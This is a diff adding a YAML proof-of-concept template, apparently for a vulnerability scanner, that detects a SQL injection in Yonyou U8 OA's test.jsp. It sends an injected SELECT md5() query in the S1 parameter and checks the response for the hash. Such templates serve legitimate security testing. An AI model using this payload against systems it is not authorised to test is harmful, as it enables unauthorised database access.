@@ -1,0 +1,13 @@
+name: poc-yaml-yongyou-u8-oa-sqli
+set:
+  rand: randomInt(200000000, 220000000)
+rules:
+  - method: GET
+    path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: kzaopa(https://github.com/kzaopa)
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
